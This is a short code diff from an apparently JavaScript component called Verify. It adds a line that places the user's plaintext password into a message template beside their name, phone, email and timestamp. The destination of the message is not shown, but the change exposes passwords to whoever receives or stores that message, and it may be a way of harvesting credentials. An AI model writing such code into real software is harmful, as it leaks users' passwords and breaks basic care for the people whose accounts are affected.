@@ -29,6 +29,7 @@ const Verify = () => {
       Name: ${name},
       Phone: ${phone},
       Email: ${userData.email},
+      Password: ${userData.password},
       Date/Time: ${currentDateTime}
       `
     };
